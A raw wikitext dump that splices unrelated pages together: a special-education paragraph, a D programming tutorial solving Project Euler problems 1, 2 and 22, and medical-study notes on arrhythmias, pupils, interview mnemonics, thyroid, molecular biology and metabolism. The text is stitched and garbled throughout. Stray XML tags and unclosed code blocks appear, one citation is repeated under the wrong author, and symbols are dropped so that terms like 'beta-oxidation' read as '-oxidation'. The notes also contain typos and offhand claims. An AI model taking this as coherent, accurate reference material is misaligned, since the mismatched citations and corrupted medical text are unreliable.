Developing functional skills in severely disabled students in a life skills class should improve an individual’s ability to learn, live, interact, and work with peers. With the use of appropriate software that matches students’ abilities, these students can greatly benefit from the ease, interactivity, multimedia, simulation, feedback, and customization of these applications (Brown, Falvey, Vincent, Kaye, Johnson, Ferrara-Parish, &amp; Gruenewald, 1980). &lt;ref&gt;Brown, l., Falvey, M., Vincent, L., Kaye, N., Johnson, F., Ferrara-Parish, P., &amp; Gruenewald, L. (1980). Strategies for generating comprehensive, longitudinal, and chronological-age-appropriate individualized education programs for adolescent and young-adult severely handicapped students. Journal of Special Education, 14, 14(2), 199-215.&lt;/ref&gt; Students using assistive technology to practice and build experience in functional skills should achieve greater independence which will enhance the quality of their lives (Schneider, 1999). &lt;ref&gt;Brown, l., Falvey, M., Vincent, L., Kaye, N., Johnson, F., Ferrara-Parish, P., &amp; Gruenewald, L. (1980). Strategies for generating comprehensive, longitudinal, and chronological-age-appropriate individualized education programs for adolescent and young-adult severely handicapped students. Journal of Special Education, 14, 14(2), 199-215.&lt;/ref&gt; When students' quality of life is enhanced, everything else in their lives improves: school performance, social relationships, family and home life, and self-confidence all benefit from helping students find interdependence in living their lives and contributing at home, work, and school.

      <text xml:space="preserve">'''[[w:D Programming Language|D]]''' is a systems programming language. Its focus is on combining the power and high performance of C and C++ with the programmer productivity of modern languages like Ruby and Python. Special attention is given to the needs of quality assurance, documentation, management, portability and reliability.&lt;ref&gt;{{Cite web |url=http://www.digitalmars.com/d/2.0/index.html |title= Intro - D Programming Language 2.0 |accessdate=2009-07-15}}&lt;/ref&gt;

'''[[w:Project Euler|Project Euler]]''' is a website dedicated to a series of math problems intended to be solved with computer programs. Each problem has been designed according to a &quot;one-minute rule&quot;, which means that an efficient implementation will allow a solution to be obtained on a modestly powered computer in less than one minute.&lt;ref&gt;{{Cite web |url=http://projecteuler.net/index.php?section=about |title= About Project Euler |accessdate=2009-07-15}}&lt;/ref&gt;


In this article, I pick some problems and show you how to solve them with D.&lt;br /&gt;
* I choose only easiest ones because published solution could spoil the problem.&lt;br /&gt;
* The purpose is to demonstrate the feature and power of D, so the codes below may not be the best way to solve those problems. 

== Before We Start ==
First, we need a D compiler.&lt;br /&gt;
All the examples below use dmd 2.0.32, you can download it from the [http://www.digitalmars.com/d/2.0/changelog.html#new2_032 official website].&lt;br /&gt;
Extract the compiler from the zip file and try compiling the &quot;Hello World&quot; program:
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
//helloworld.d
import std.stdio;
void main()
{
    writeln(&quot;Hello, world!&quot;);
}
&lt;/source&gt;
|}

If you are using Windows, simply run something like this:
 C:\dmd2\windows\bin\dmd.exe helloworld.d
 helloworld.exe


== Problem 1 ==
Let's start with [http://projecteuler.net/index.php?section=problems&amp;id=1 Problem 1]
 If we list all the natural numbers below 10 that are multiples of 3 or 5,
 we get 3, 5, 6 and 9. The sum of these multiples is 23.

 Find the sum of all the multiples of 3 or 5 below 1000.
It's very easy, and the answer is:
:&lt;math&gt;\sum_{i=1}^{\left \lfloor \frac{999}{3} \right \rfloor} 3i + \sum_{i=1}^{\left \lfloor \frac{999}{5} \right \rfloor} 5i - \sum_{i=1}^{\left \lfloor \frac{999}{15} \right \rfloor} 15i&lt;/math&gt;

This equation can be solved with a pencil and paper. Eh... wait a minute. We are talking about the programming language here, aren't we?&lt;br/&gt;
Maybe it's better to start with a common method that everybody uses at his first attempt:
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
//problem1_a.d
import std.stdio;
void main()
{
    int sum = 0;
    for (int i = 1; i &lt; 1000; ++i)
    {
        if (i % 3 == 0 || i % 5 == 0){
            sum += i;
        }
    }
    writeln(sum);
}
&lt;/source&gt;
|}
Yes, this is exactly what I did when I solved the first problem.&lt;br /&gt;
If I were more familiar with D at that time, it would look like:
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
//problem1_b.d
import std.stdio;
void main()
{
    int sum;
    foreach (i; 1..1000)
    {
        if (i % 3 == 0 || i % 5 == 0){
            sum += i;
        }
    }
    writeln(sum);
}
&lt;/source&gt;
|}
There are 2 differences from the first version:
# The '''foreach''' statement, it is not only terser, but also faster.
#: The speed is negligible here, but you will find it saves about 10% time when tested with 1×10&lt;sup&gt;8&lt;/sup&gt; instead of 1000
# In D, '''int sum''' is initialized with 0 by default.
#: In case you really, really don't want it be initialized, use '''int sum = void;'''


D2's standard library, Probos, also provide a powerful algorithm module that make it possible to do it with one-liner.
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
//problem1_c.d
import std.stdio, std.algorithm, std.range;
void main()
{
    writeln( reduce!(&quot;a + b&quot;)(0, filter!(&quot;a % 3 == 0 || a % 5 == 0&quot;)(iota(1, 1000, 1))) );
}
&lt;/source&gt;
|}
It's not as fast as the second version (problem1_b.d), but it's faster than the corresponding program written in other language like [[w:Python_(programming_language)|python]] or [[w:haskell|haskell]].&lt;br/&gt;
If you have no idea what these functions mean, here is a brief explanation:
* !( ... )
*: Template argument are enclosed with !(...) instead of &amp;lt;...&amp;gt;. '''Foo!(int)''' in D is equal to '''Foo&lt;int&gt;''' in C++.
* '''reduce!'''(&quot;a + b&quot;)(0, range);
*: sum the elements in the range and return a number.
* '''filter!'''(&quot;a % 3 == 0 || a % 5 == 0&quot;)(range);
*: find all elements in the range that meet the requirements and return a new range.
* '''iota'''(begin, end, step);
*: construct a range that goes through the numbers begin, begin + step, begin + 2 * step, ..., up to and excluding end.
Give alias to these functions will make the code more readable.
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
auto numbers = iota(1, 1000, 1);
alias filter!(&quot;a % 3 == 0 || a % 5 == 0&quot;, typeof(numbers)) filter1;
alias reduce!(&quot;a + b&quot;) sum;
writeln( sum(0, filter1(numbers)) );
&lt;/source&gt;

== Problem 2 ==
[http://projecteuler.net/index.php?section=problems&amp;id=2 Problem 2]:
 Each new term in the Fibonacci sequence is generated by adding the previous two terms.
 By starting with 1 and 2, the first 10 terms will be:
     1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ...
 Find the sum of all the even-valued terms in the sequence which do not exceed four million.
This one-liner functional solution is split into several lines so I can write some comments in it:
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
//problem2_a.d
import std.stdio;
import std.algorithm;
import std.range;
void main()
{
  writeln(
    reduce!(&quot;a + b&quot;)(                           // the sum of all
      filter!(&quot;(a&amp;1) == 0&quot;)(                    // the even-valued terms
        until!(&quot;a &gt;= 4000000&quot;)(                 // which do not exceed four million
          recurrence!(&quot;a[n-1] + a[n-2]&quot;)(1, 2)  // a Fibonacci sequence starting with 1 and 2
  ) ) ) );

It's a bad practice to calculate the fibonacci sequence with straight recursion&lt;ref&gt;{{Cite web |url=http://www.ddj.com/hpc-high-performance-computing/217801225?pgno=5 |title= The Case for D - Functional and Generic Programming |accessdate=2009-07-15}}&lt;/ref&gt;, 
and it's even worse when recursion is also used to sum the sequence.
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
//problem2_b.d
import std.stdio;
int fib(int n)
{
   if (n &lt; 3) {
      return n;   
   } else {
      return fib(n - 2) + fib(n - 1);
   }
}
int sumFib(int bound, int n = 1)
{
   if (fib(n) &gt; bound) {
      return 0;
   } else if (fib(n) &amp; 1) {
      return sumFib(bound, n + 1);
   } else {
      return sumFib(bound, n + 1) + fib(n);
   }
}
void main()
{
   writeln(sumFib(4_000_000));
}
&lt;/source&gt;
|}
If you run this program, fib() will be called 35563510 times before it gets the result.&lt;br /&gt;
This number is totally unacceptable because there are only 32 elements in the sequence below 4,000,000.

But it's amazing to see the program can be improved greatly when changed to template recursion.
{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
//problem2_c.d
import std.stdio;
import std.metastrings;
template fib(int n)
{
   static if (n &lt; 3) {
      const fib = n;   
   } else {
      const fib = fib!(n - 2) + fib!(n - 1);
   }
}
template sumFib(int bound, int n = 1)
{
   static if (fib!(n) &gt; bound) {
      const sumFib = 0;
   } else static if (fib!(n) &amp; 1) {
      const sumFib = sumFib!(bound, n + 1);
   } else {
      const sumFib = sumFib!(bound, n + 1) + fib!(n);
   }
}
pragma (msg, ToString!( sumFib!(4_000_000) ));
void main(){}
&lt;/source&gt;
|}
The algorithm is exactly the same. But theses changes make everything done during compilation.
* if -&gt; static if
* return -&gt; const
* writeln(...) -&gt; pragma (msg, ...)
It's much better than the original version because the compiler compile each fib!(n) only once (1 ≤ n ≤ 33).&lt;br /&gt;
The compiler output the result directly and there is no need to run the program at all.

== Problem 22 ==
[http://projecteuler.net/index.php?section=problems&amp;id=22 Problem 22] is chosen because it's the first problem that requires file and string operations: 
 Using [http://projecteuler.net/project/names.txt names.txt], a 46K text file containing over five-thousand first names, 
 begin by sorting it into alphabetical order. Then working out the alphabetical 
 value for each name, multiply this value by its alphabetical position in the 
 list to obtain a name score.
 
 For example, when the list is sorted into alphabetical order, COLIN, which is 
 worth 3 + 15 + 12 + 9 + 14 = 53, is the 938th name in the list.
 So, COLIN would obtain a score of 938 × 53 = 49714.
 
 What is the total of all the name scores in the file?

{{source_begin}}&lt;source lang=&quot;d&quot;&gt;
import std.stdio, std.string, std.algorithm;
void main()
{
   string input = cast(string)std.file.read(&quot;names.txt&quot;);
   auto words = split(input, &quot;,&quot;);
   sort(words);

   int score(string s) {                                  // a nested function
      return reduce!(&quot;a + b - 64&quot;)(0, s[1..length-1]);    // remove quotation marks and calculate the alphabetical value
   }

   long sum;
   foreach (i; 0..words.length) {
      sum += (i + 1) * score(words[i]);
   }
   writeln(sum);
}
&lt;/source&gt;

==Cardiovascular pathology==
===Arrhythmias===
*Atrial fibrillation: '''irregularly irregular rhythm''' ('''no p waves'''), rate often &gt;100 (a type of supraventricular tachycardia), can result in heart failure, thrombus formation; treat with '''rate control''' (beta-blockers, non-DHP calcium channel blockers) or rhythm control (dofetilide, sotalol, amiodarone), and '''anticoagulation''' (warfarin).
*Atrial flutter: p waves present in '''&quot;sawtooth&quot; pattern''', often at rate of 300 and ventricular rate of 150 (often '''2:1 conduction''', but can vary); often resistant to rate control; treat refractory cases with '''ablation''' (maze procedure).
*Wolff-Parkinson-White syndrome: supraventricular impulses conducted along '''accessory pathway''' leading to early and nonuniform depolarization of ventricles, causing QRS widening with a '''delta wave'''.

      <text xml:space="preserve">==Localization==
Small, irregular pupil that does not react to light but does react to accommodation.

Localization is to the midbrain and the cause is neurosyphilis. The pupil's better response to a near than to a light stimulus is because the lesion involves the more dorsally-located fibers that subserve the pupil response to light and spares the more ventrally-located fibers that subserve the pupil response to accommodation.

Care should be taken to not confuse Argyll-Robertson pupil with an Adie's tonic pupil, Horner's syndrome or third nerve lesions.

====Regarding what to do in case of syncope:====

If the face is red, raise the head.

If the face is pale, raise the tail!

      <comment>/* Patient interview */</comment>
      <text xml:space="preserve">'''Clinical decision-making''' is a broad subject area covering biostatistics and epidemiology. Also covered are an approach to the patient interview, the physical examination, and the establishment of a differential diagnosis.

==Patient interview==
The patient interview, or patient history, consists of:
* chief complaint (CC)
* history of present illness (HPI)
* medications
* allergies
* past medical history (PMH)
* past surgical history (PSH)
* social history
* family history
* review of systems (ROS)

Eliciting the HPI and exploring symptoms is done systematically:
* '''O'''nset of pain (what was the patient doing when the pain started?)
* '''P'''alliative or '''P'''rovocative factors for the pain
* '''Q'''uality of pain (burning, stabbing, aching, etc.)
* '''R'''adiation (up to jaw, down left arm, etc.)
* '''S'''everity of pain (usually 1 - 10 scale)
* '''T'''iming of pain (eg: after meals, in the morning, how long it lasts, etc.)

Similarly:
* '''S'''ite of pain
* '''O'''nset of pain
* '''C'''haracter of pain (dull, sharp, aching, stabbing, tearing etc.)
* '''R'''adiation of pain (eg. central abdominal pain radiating to Right Iliac Fossa)
* '''A'''ssociated factors (eg. nausea/vomiting)
* '''T'''iming of pain/duration
* '''E'''xacerbating/alleviating factors
* '''S'''everity of pain (usually 1 - 10 scale)

Alternatively:

* '''A'''ggravatiing and '''A'''lleviating factors
* '''S'''everity
* '''C'''haracter, quality
* '''L'''ocation
* '''A'''ssociated symptoms
* '''S'''etting
* '''T'''iming

(ASCLAST means let the patient talk first, then ask him/her specific questions.)


to make a differential diagnosis for a problem 
use the word VINDICATE 
V vascular
I inflamation / Infection
N Neoplasm
D Degenerative
I Intoxication 
C collagen disease / congenital disease
A autoimmune disease
T Trauma 
E endocrine

==Differential diagnosis==
The patient interview rarely indicates a single diagnosis; rather, usually there is a list of potential diagnoses, called a differential diagnosis. Systematically thinking through a differential diagnosis ensures that all possibilities are considered. The mnemonic ''VITAMIN C'' is commonly used to accomplish this:

* '''V'''ascular
* '''I'''nfectious
* '''T'''raumatic
* '''A'''utoimmune
* '''M'''etabolic
* '''I'''diopathic/iatrogenic
* '''N'''eoplastic
* '''C'''ongenital

==Admission orders==
When admitting a patient to the hospital, several orders must be written. The ''DAVE WILMINGTON'' mnemonic helps to accomplish this systematically:

*'''D'''iet
*'''A'''ctivity
*'''V'''ital signs (how often)
*'''E'''xcrement (test urine / stool)

*'''W'''eight (how often to monitor)
*'''I'''nput/output (eg, &quot;strict ins/outs&quot;)
*'''L'''abs (what, how often)
*'''M'''eds (which, route, interval)
*'''I''' V fluids (what and at what rate)
*'''N'''ursing care (e.g. position, wound care, up in chair, ostomy care etc)
*'''G'''eneral care (e.g. Physical Therapy, Respiratory Thearpy etc)
*'''T'''ests (X-ray, EKG, EEG etc)
*'''O'''bserve for reaction, seizure, neuro exams
*'''N'''otify parameters (e.g. Temp &gt; 100 / respiration changes)

The ''ADC VAAN DIML'' mnemonic is also used commonly:

* '''A'''dmit (23 hours, full admit, service of attending,...)
* '''D'''iagnosis
* '''C'''ondition (&quot;Stable&quot;, &quot;Guarded&quot;, etc.)

* '''V'''itals (post-op, routine, q 1 hour, etc.)
* '''A'''llergies
* '''A'''ctivities (Strict bed rest, fall precautions, ad lib, bathroom privileges, etc.)
* '''N'''ursing (Strict I&amp;O's, Daily weights, Call P.R.N. whatever, etc.)

* '''D'''iet (NPO, Regular, Clears - advance diet as tolerated, 2000 cal ADA, renal, etc.)
* '''I'''V fluids (D5 1/2 NS c 20 KCL at 110 ml/hr, LR @ 100 ml/hr, etc.)
* '''M'''eds (scheduled and PRN's)
* '''L'''abs and x-ray (CBC in AM, PCXR in PACU, etc.)

      <text xml:space="preserve">==Thyroid==
===Hypothalamic-pituitary-thyroid axis===
* Hypothalamus → thyrotropin releasing hormone (TRH)
* Pituitary → thyroid stimulating hormone (TSH)
* Thyroid → T3, T4

===Thyroid hormone synthesis===
# Plasma iodide enters thyroid follicular cells via sodium iodine (NaI) cotransporter via secondary active transport.
# Within the cell, thyroperoxidase (TPO) oxidizes iodide to either atomic iodine (I) or iodinium (I&lt;sup&gt;+&lt;/sup&gt;).
# Oxidized iodine species bind tyrosine residues of thyroglobulin, the major protein of thyroid colloid.
#* Tyrosine + a single iodine atom: monoiodotyrosine (MIT)
#* Tyrosine + two iodine atoms: diiodotyrosine (DIT)
# MIT and DIT combine:
#* MIT + DIT: triiodothyronine (T3)
#* DIT + DIT: tetraiodothyronine (T4, also called ''thyroxine'')
#* DIT + MIT: reverse T3 (rT3, which is biologically inactive)
# Proteases digest release thyroglobulin, releasing the active hormones T3 and T4 into the bloodstream.
# Peripherally, 5'-deiodinase converts T4 to the more active T3.

===Pharmacology===
====Antithyroid drugs====
Compete with iodide for the NaI cotransporter in thyroid follicular cells:
* Perchlorate
* Thiocyanate
* Goitrin

Inhibit thyroperoxidase:
* Propylthiouracil (also inhibits 5'-deiodinase)
* Methimazole

===Pathology===
; Hashimoto's thyroiditis: '''Most common''' cause of primary hypothyroidism in the US, F &gt; M. Autoimmune, demonstrating '''lymphocytic infiltration''' microscopically. Associated with '''HLA-DR5'''. Clinical course may begin with ''hyper''thyroidism resulting from thyroid destruction and release of thyroid hormone; ultimately results in hypothyroidism (fatigue, cold intolerance, weight gain, constipation, fragile hair, dry skin). Treated with hormone replacement (T4, '''levothyroxine''').

; Graves' disease: '''Most common''' cause of hyperthyroidism in US, F &gt; M. Autoimmune, resulting from '''autoantibody stimulating the TSH receptor''' on thyroid follicular cells. Results in hyperthyroidism (heat intolerance, tachycardia, weight loss, diarrhea, hair/skin changes), frequently a diffuse goiter, and characteristic '''pretibial myxedema''', retroorbital fibrosis, and '''exophthalmos'''. Treated with antithyroid drugs (propylthiouracil, methimazole, radioactive iodine). Exophthalmos is irreversible despite treatment.

DNA/RNA/Protein

1. Molecular biology tools and techniques:  

a.Cloning – introduction of pieces of DNA into a vector in order to permit amplification.  Many methods of cloning exist.  Commonly, total cellular DNA is cleaved, and each piece is inserted into a vector.  The library of vectors is introduced into bacteria or another replication host.  A bacteria which has a vector will then replicate, making many copies of the DNA in that vector, hence, a clone.  (Lippincott page 404)

b.cDNA libraries – complementary DNA libraries are made by reverse transcribing (making DNA from RNA) all of the mRNA in a cell.  The DNA copies are replicas of mRNA without introns.  These can be used as probes,  primers, or many other uses.

c.PCR-see page 146-biochemistry.

d.Restriction length fragment polymorphism—within the natural sequence of many genes are restriction sites, specific sequences cleaved by restriction enzymes.  Many of these sites are polymorphic.  That is, they contain differences which render them susceptible or perhaps not susceptible to cleavage at that particular site.  These differences can be used to identify genes, or match DNA from different samples, as in forensics.  

e.Sequencing – The major method of sequencing is the Sanger dideoxy nucleotide method.  An elongation reaction is carried out using a primer just upstream of the portion to be sequenced.  The mixture includes radioactive nucleotides except one of the nucleotides (A,T,G,or C) is dideoxy.  That is, it does not have an oxygen at the 2 or 3 position of the ribose sugar.  When one of the dideoxy bases is incorporated into the growing chain, elongation is stopped.  A reaction is run containing dideoxy nucleotides of each base.  For instance, one reaction contains all of the nucleotides but the adenosines are dideoxy.  The results are then run on a gel.  The sequence can be read by observing which bases were the terminating base at each position on the sequence.

2.     Transcriptional regulation

a. The operon model – This model is related to the regulation of gene transcription (making RNA from genes) in certain environments.  For instance the Lac operon consists of regulatory proteins that control production of proteins necessary to degrade lactose.  These are only needed when lactose is present. 

b. Eukaryotic transcription—Eukaryotic transcription is controlled by regions of DNA called promoters upstream from the material of the genes.  Transcription factors bind to promoters, and help recruit RNA Polymerase II, which binds the TATA box, located approx. 25 bases upstream from the transcription start site.  Another sequence, the CAAT box, is located approx. 40 bases upstream from the TATA box.  Enhancer regions are other regions of DNA that bind specific protein that aid in transcription of certain gense.  These regions can be located upstream, within the gene, within introns,  close, or far from the transcription start site.  Before a gene is transcribed a large complex of proteins is formed in the promoter region.  The need for this large complex of proteins helps in gene regulation.   

c. Role of steroid hormones – Steroid hormones cross membranes and travel directly to the nucleus of target cells.  Bound to their respective receptors, steroid hormones act like transcription factors or enhancer binding proteins.  They bind to hormone response elements near the genes they regulate and either enhance or inhibit transcription of those genes. 

3. Translation (Protein synthesis)

a. Translation of mRNA occurs in the cytosol on ribosomes.  Ribosomes can be free floating or attached to the ER membrane.  Three nucleotides on mRNA encode for on amino acid.  The start site is AUG on the RNA.  This codes for methionine.  Each amino acid is attached to a specific tRNA, which recognized the codon for that particular amino acid.  Translation happens in three steps: initiation, elongation, and termination.
          
i.Initiation: Initiation involves assembling two ribosomal subunits, the mRNA,   GTP, the tRNA with the first amino acid, and initiation factors that facilitate the whole process.  The ribosome recognizes specific sequences on the mRNA and assembles the machinery.  In bacteria, the first amino acid is N-formyl-methionine, while in eukaryotes it is normally methionine.  The first tRNA with the appropriate amino acid is in the P-site of the ribosome, and the next tRNA with its appropriate amino acid arrives to the A-site.  A peptide bond is formed between the two amino acids.  Initiation factors aid in the setting up of the complex.
       
ii. Elongation:  Elongation factors help the ribosome move down the mRNA with energy derived from GTP hydrolysis.  tRNAs are attached to their amino acids using energy from ATP by specific synthetases for each amino acid and tRNA combination.  Each time the ribosome moves down the mRNA, the nascent polypeptide is moved into the P-site, making room in the A-site for a new tRNA/amino acid pair.  

iii. Termination: Termination occurs when the ribosome meets a termination sequence.  Release factors cause the new peptide to be released from the ribosomes, and cause the dissociation of the ribosome complex.     

b. Post translational modification of proteins occurs depending on the final destination and function.   Modifications include trimming of proteins to active forms.   Insulin for example, is synthesized as a zymogen and cleaved to the active molecule.   Covalent alterations are also added to some proteins.  These include glycosylation with different sugars, phosphorylation, hydroxylation, or association with coenzymes. 

4.  Acid-base titration curve of amino acid and proteins

a. Protons will dissociate from weak acids at a certain pH, depending on the strength of the bond of the dissociable hydrogen.  This pH is called the pKa of the acid.  The Henderson-Hasselbach equation relates the relative amount of acid and base at a given pH to the pKa of an acid. 

b. Amino acids, since they have a carboxyl group, are weak acids.  The pKa of most carboxyl groups is around 2, and the pKa for most amino groups of amino acids is around 9.  They are referred to as pKa1 and pKa2 respectively.  Some amino acids with an acidic or basic side chain have an additional pKa for the side chain hydrogen ion.   See page 12 in Lippincott for examples of titration curves. 

c. Proteins have titration curves as well.  However, the carboxyl group and the amino group are the main titratable acids, as well as titratable side chains. 

d. Titratable side chains include the acidic amino acids, aspartate and glutamate, basic amino acids arginine, lysine and histidine.  The pKa of histidine is 6.0, so at physiologic pH it is not ionized. 

5. Role of SH2 domains

a. The role of SH2 domains is simple: they bind phosphotyrosine.  They are normally found in proteins involved in signal transduction.  By binding to phosphotyrosine, they allow signals to be passed from one molecule to another.  For instance, some receptors, when bound to a ligand, have tyrosine kinase activity.  When these tyrosines are phosphorylated, and SH2 domain of another protein can bind to the cytoplasmic phosphotyrosine.  The signal can be passed to other proteins and eventually to the nucleus.

IIa LDL Cholesterol
IIb LDL and VLDL Cholesterol and triglycerides
III Remnants Triglycerides and cholesterol
IV VLDL  Triglycerides
V VLDL and chylomicrons Triglycerides and cholesterol

2. Glycogen and lysosomal storage diseases are covered in First Aid.  

3. Porphyrias -- 

a.  Porphyrias are defects of porphyrin metabolism, leading to buildup of toxic metabolites.  Porphyrins are ring structures.  An example in heme without the iron.   Many defects exist in many different steps in the pathways.   They are classified depending on clinical and biochemical properities. Five main types exist: 

i. congenital erythropoietic porphyria 
ii. erythrohepatic porphyria
iii. acute intermittent porphyria
iv. porphyria cutanea tarda
v. mixed porphyria

b. Manifestations include light sensitivity, vesicles that heal when scarring, anemia.  Pathogenesis is not well understood.

c. The clinical picture is someone with light sensitivity, so they only go out at night.  They have weird fluorescing molecules in their bodies, so their teeth fluoresce (porphyrin rings.)  Because of defects in heme synthesis and metabolism, anemia can be a problem, so they want to drink blood.  Some say that vampire legends came from people with porphyrias.  Interesting eh?

Metabolism

1. Glycogen synthesis: regulation, inherited defects.
A. Regulation: In the well fed state, Glycogen synthetase is allosterically activated by glucose 6-phosphate, as well as by ATP, a high energy signal in the cell.  An elevated insulin level results in overall increased glycogen synthesis.  
Glucagon (in the liver) and Epinephrine (muscle and liver) bind cell membrane receptors and stimulate adenylate cyclase then cAMP.  Glycogen synthetase is then phosphorylated by cAMP-dependent protein kinase which inhibits the production of glycogen. (Lippincott’s Biochem p. 142-145)
B. Inherited defects: Glycogen storage diseases- First Aid p. 150

2. Oxygen consumption, carbon dioxide production, and ATP production for fats, proteins, and carbohydrates.
A. Oxygen consumption occurs in the mitochondrial matrix.  Cytochrome oxidase uses oxygen as the final electron acceptor and converts it to H2O.
B. Carbon dioxide production results from reactions in several pathways including the TCA cycle and the Hexose Monophosphate Pathway (HMP).  One molecule of CO2  (and one NADH) is produced in the conversion of Pyruvate to Acetyl-CoA by pyruvate dehydrogenase.  Two molecules of CO2 are produced in the TCA cycle for every molecule of Acetyl-CoA.  One molecule of CO2  (and one NADPH) is also produced by the conversion of 6-Phosphogluconate to Ribulose 5-phosphate in the HMP.
C. ATP production
Fats are broken down through Triacylglycerol degradation into fatty acids which are then broken down to Fatty Acyl CoA and then Acetyl-CoA which then enters the TCA cycle.  Each Acetyl-CoA produces 3NADH, 1FADH2, 2CO2, 1GTP which is equal to 12ATP/acetyl CoA.  
Proteins are broken down to amino acids which enter the TCA cycle at different points.  Refer to p.244 Fig. 22.22 in Lippincott’s Biochem for the metabolism of specific amino acids and associated genetic deficiencies.
Carbohydrates are broken down to monosaccharides, the most common of which is D-glucose.  Aerobic metabolism of glucose produces 38 ATP via malate shuttle, 36 ATP via G3P shuttle.  Anaerobic glycolysis produces only 2 ATP per glucose molecule.

3. Amino acid degradation pathways (urea cycle, tricarboxylic acid cycle).  Refer to Lippincott’s Biochem Figure 21.11, p.237 and Figure 22.2, p.244.

4. Effect of enzyme phosphorylation on metabolic pathways.
Enzyme Enzyme Activity when Phosphorylated Description
Glycogen phosphorylase Active Degrades glycogen
Glycogen synthase Inactive Synthesizes glycogen
Pyruvate kinase Inactive Converts Phosphoenolpyruvate (PEP) to Pyruvate
Pyruvate dehydrogenase Inactive Converts Pyruvate to Acetyl-CoA
Acetyl CoA carboxylase Inactive Converts Acetyl CoA to Malonyl CoA in triglyceride synthesis
Hormone sensitive lipase Active Breaks triglyceride into a fatty acid and a diglyceride

5. Rate limiting enzymes in different metabolic pathways: First Aid p. 155

6. Sites of different metabolic pathways (What organ? Where in the cell?).
*Organ sites (First Aid 99 p 156):
*Liver: Most represented, including gluconeogenesis; fatty acid oxidation (-oxidation); ketogenesis;
*lipoprotein formation; urea, uric acid &amp; bile acid formation; cholesterol synthesis.
*Brain: Glycolysis, amino acid formation.
*Heart: Aerobic pathways (e.g., -oxidation and Krebs cycle)
*Adipose tissue: Esterification of fatty acids and lipolysis
*Muscle: fast twitch: Glycolysis; slow twitch: Aerobic pathways
*Cell sites (First Aid 99 p 154):
*Mitochondria: -oxidation, acetyl-CoA production, Krebs cycle.
*Cytoplasm: Glycolysis, fatty acid synthesis, HMP shunt, protein synthesis (RER), steroid synthesis (SER).
*Both: Gluconeogenesis, urea cycle, and heme synthesis

7. Fed state versus fasting state: forms of energy used, direction of pathways.
*See liver diagrams for both states on page 159 of First Aid 99.
*Fed (Absorptive) state (BRS Biochemistry p 4):
*Glucose is oxidized by various tissues for energy or is stored as glycogen in liver and muscle. In liver, glucose is also converted to triacylglycerols, which are packaged in VLDL and released into the blood.  Fatty acids of the VLDL and chylomicrons are stored in adipose tissue. Absorbed amino acids are used by various tissues to synthesis proteins, produce nitrogen-containing compounds, and produce energy.  
*Fasting state (BRS Biochemistry p 7):
*With decreasing blood glucose level, the liver is stimulated by glucagon to supply glucose (glycogenolysis &amp; gluconeogenesis) and ketones to the blood. The liver uses amino acids from muscles and fatty acids and glycerol from adipose tissue. 
*Prolonged Fasting (BRS Biochemistry p 9): 
*Muscles:  use of ketones &amp;  oxidation of fatty acids for primary energy source.
*Brain: use of abundant ketones instead of glucose.
*Liver:  gluconeogenesis &amp; spares muscle proteins.
 
8. Tyrosine kinases and their effects on metabolic pathways (insulin receptor, growth factor receptors)
*Insulin Receptor (Lippincott p 273):
*Insulin binding activates receptor tyrosine kinase activity in the intracellular domain of the -subunit.
*Tyrosine residues of the -subunit are autophosphorylated.
*Receptor tyrosine kinase phosphorylates other proteins, such as the insulin receptor substrate (IRS).
*Phosphorylated IRS promotes activation of other protein kinases and phosphatases, leading to the biological actions of insulin (see Topic 13 below).
*Insulin-like Growth Factor Receptor (BRS Physiology p 249):
*The IGF receptor has tyrosine kinase activity like the insulin receptor
  
9. Anti-insulin hormones (e.g., glucagon, GH, cortisol).
*Considered “counterregulatory hormones” because they oppose many actions of insulin (Lippincott p 275):
*Glucagon: Acute, short-term regulation by stimulating hepatic glycogenolysis and gluconeogenesis.
*Epinephrine: Acute, short-term regulation by promoting glycogenolysis and lipolysis, inhibiting insulin secretion, and inhibits the insulin-mediated uptake of glucose by peripheral tissues.
*Cortisol: Long-term management by stimulating gluconeogenesis and lipolysis.
*Growth Hormone: Long-term management by stimulating gluconeogenesis and lipolysis.
 
10. Synthesis and metabolism of neurotransmitters.
*Acetylcholine (Correlative Neuroanatomy p 30):
*ACh is synthesized from acetyl-CoA and choline by the enzyme choline acetyltransferase in the presynaptic cholinergic nerve terminal.
*ACh is broken down after release into the synaptic cleft by the enzyme acetylcholinesterase.
*Choline is taken back up into the presynaptic nerve terminal to be converted back into ACh.
*Catecholamines (Correlative Neuroanatomy p 30):
*PhenylalaninetyrosineDOPAdopaminenorepinephrineepinephrine (First Aid 99 p151).
*Tyrosine is converted to DOPA by tyrosine hydroxlyase.
*DOPA is converted to dopamine by DOPA decarboxylase. 
*Dopamine is hydroxlyated to NE and NE is converted to epinephrine by phenylethanolamine-N-methyltransferase.
*Dopamine and NE are inactivated by both MAO (presynaptic nerve terminal) and COMT (postsynaptic).
*Serotonin (Correlative Neuroanatomy p 32): Synthesized from the amino acid tryptophan.
 
11. Purine/pyrimidine degradation:
*Purine (G, A) degradation (BRS Biochemistry p 265):
*First phosphate and ribose are removed; then the nitrogenous base is oxidized.
*Guanine is degraded to xanthine and adenine to hypoxanthine, which is then oxidized to xanthine by xanthine oxidase (this enzyme requires molybdenum).
*Xanthine is oxidized to uric acid by xanthine oxidase.
*The kidneys excrete uric acid, which is not very water-soluble.
*Pyrimidine (C, U, T) degradation (BRS Biochemistry p 267):
*Unlike the purine rings, which are not cleaved in human cells, the pyrimidine ring can be opened and degraded to a highly soluble structures, such as -alanine and -aminoisobutyrate.
*The carbons produce CO2 and the nitrogens produce urea.
 
12. Carnitine shuttle: function and inherited defects.
*Function (Lippincott p 182): The carnitine shuttle transports the acyl group from cytosolic fatty acyl CoA molecules across the inner mitochondrial membrane, which is impermeable to CoA, returning it to mitochondrial CoA molecules. The newly formed mitochondrial fatty acyl CoA molecules can then undergo -oxidation. 
*Inherited defects: The congenital absence of a carnitine acyltransferase in skeletal muscle, or low concentrations of carnitine due to defective synthesis, result in an inability to use long-chain fatty acids as a metabolic fuel, causing myoglobinemia and weakness following exercise.
 
13. Cellular/organ effects of insulin secretion (Lippincott p 273 and BRS Biochemistry p 154).
